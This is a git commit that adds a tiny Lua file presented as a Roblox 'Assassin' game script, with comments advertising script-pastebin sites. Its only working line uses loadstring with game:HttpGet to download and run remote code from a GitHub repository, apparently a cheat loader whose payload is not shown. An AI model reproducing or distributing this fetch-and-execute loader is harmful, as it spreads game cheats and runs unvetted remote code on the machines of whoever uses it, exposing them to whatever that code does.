da389197ad754e6090668835286a178e4e273ba9
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-25 16:59:10 +0100

    commit zero

---
+++ LINK GAME Script pastebin roblox Assassin .lua
@@ -0,0 +1,11 @@
+-- find more powerfull verified and New Scripts here : https://script-pastebin.com
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/bockatta/Shitter/main/Loader'))();
+
+-- find more powerfull verified and New Scripts here : https://scriptpastebin.io
+
+--[[ Script Description:
+
+							Script for a legit game in this place!
+						
+]]
